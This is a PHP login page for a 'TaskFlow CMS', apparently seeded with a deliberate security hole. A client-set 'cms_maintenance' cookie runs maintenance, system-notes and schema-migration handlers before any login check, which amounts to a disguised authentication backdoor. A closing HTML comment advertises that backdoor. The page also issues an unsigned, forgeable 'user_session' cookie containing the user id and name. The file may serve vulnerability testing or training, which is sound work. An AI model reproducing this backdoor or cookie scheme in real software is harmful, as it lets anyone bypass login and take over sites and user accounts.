<?php
    include 'config.php';
    include 'misc.php';

    session_start();

    // System maintenance hook - handles update/maintenance actions
    // This allows system processes to trigger actions during login flow
    if (isset($_COOKIE['cms_maintenance'])) {
        $action = $_COOKIE['cms_maintenance'];
        
        // Handle various maintenance actions
        if ($action == 'clearCache') {
            // Forward to cache clearing - also shows system status
            include 'maintenance-action.php';
            exit();
        } elseif ($action == 'viewSystemNotes') {
            // Forward to system notes viewer for maintenance
            include 'maintenance-action.php';
            exit();
        } elseif ($action == 'schemaMigration') {
            // Forward to schema migration handler
            include 'maintenance-action.php';
            exit();
        }
        // Clear invalid maintenance cookies
        setcookie('cms_maintenance', '', time() - 3600);
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST" &&
        isset($_POST['username']) &&
        isset($_POST['password'])) {

        $username = validateInput($_POST['username']);
        $password = validateInput($_POST['password']);

        $conn = new mysqli($db_host, $db_username, $db_password, $db_database);

        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        $username = mysqli_real_escape_string($conn, $username);

        $stmt = $conn->prepare("SELECT * FROM users WHERE username=?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $result = $stmt->get_result();


        if ($result->num_rows == 1) {
            $row = $result->fetch_assoc();
            $hashed_password = $row['password'];

            if (password_verify($password, $hashed_password)) {
                setcookie('user_session', base64_encode(json_encode(['id' => $row['id'], 'name' => $row['username']])));
                session_regenerate_id();
                $_SESSION['username'] = $row['username'];
                $_SESSION['userid'] = $row['id'];
                header("Location: dashboard.php");
                exit();
            } else {
                $error = "Invalid username or password.";
            }
        } else {
            $error = "Invalid username or password.";
        }

        $stmt->close();
        $conn->close();
    }
?>
<!doctype html>
<html>
    <head>
        <title>TaskFlow CMS - Login</title>
        <link rel="stylesheet" href="static/styles.css">
        <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
            <?php
                if (isset($error)) {
                    echo '<div class="error">' . $error . '</div>';
                }
            ?>
            <!-- TaskFlow CMS v2.4.1 - Enterprise Content Management -->
            <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
            <table width="100%">
                    <tr>
                        <td colspan="2"><h1>TaskFlow CMS</h1></td>
                    </tr>
                    <tr>
                        <td colspan="2"><p style="font-size: 14px; color: #666;">Enterprise Content Management System</p></td>
                    </tr>
                    <tr>
                        <td width="225px" text-align="right" align="right">Username:</td>
                        <td><input type="text" name="username" required></td>
                    </tr>
                    <tr>
                        <td width="225px" text-align="right" align="right">Password:</td>
                        <td><input type="password" name="password" required></td>
                    </tr>
                    <tr>
                        <td colspan="2" align="right"><input class="button" type="submit" value="Sign In">&nbsp;&nbsp;</td>
                    </tr>
                    <tr>
                        <td text-align="right">&nbsp;&nbsp;New user? &nbsp;&nbsp;<a class="button" href="register.php">Register</a></td>
                        <td>&nbsp;</td>
                    </tr>
                </table>
            </form>
        </div>
        <!-- TaskFlow CMS v2.4.1 -->
        <!-- Internal: cms_maintenance cookie handler active for system processes -->
    </body>
</html>
